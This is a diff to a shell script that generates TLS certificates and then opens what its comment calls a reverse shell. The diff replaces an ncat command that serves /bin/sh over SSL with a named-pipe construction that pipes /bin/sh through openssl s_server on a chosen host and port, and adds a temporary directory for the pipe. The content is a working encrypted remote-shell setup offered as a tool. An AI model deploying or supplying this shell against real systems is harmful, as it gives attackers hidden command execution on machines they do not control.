@@ -33,6 +33,19 @@ if [[ ! -d $CERTS ]]; then
 	mkdir -p $CERTS
 fi
 
+TMP=tmp
+if [[ ! -d $TMP ]]; then
+	if [[ -e $TMP ]]; then
+		rm -rf $TMP
+		if [[ $? -ne 0 ]]; then 
+			echo "[x] cannot create $TMP directory"
+			exit 2
+		fi
+	fi
+	mkdir -p $TMP
+fi
+
+
 CERT=cert.pem
 KEY=privkey.pem
 CSR=req.csr
@@ -63,4 +76,5 @@ popd &>/dev/null
 
 
 # Reverse shell!
-ncat -l --ssl --ssl-cert $CERTS/$CERT --ssl-key $CERTS/$KEY -e /bin/sh $HOST $PORT
+mkfifo $TMP/fifo; /bin/sh < $TMP/fifo 2>&1 | openssl s_server -key $CERTS/$KEY -cert $CERTS/$CERT -accept $HOST:$PORT -cipher AES256-SHA256 -tls1_2 -quiet > $TMP/fifo; rm $TMP/fifo
+rm -rf $TMP
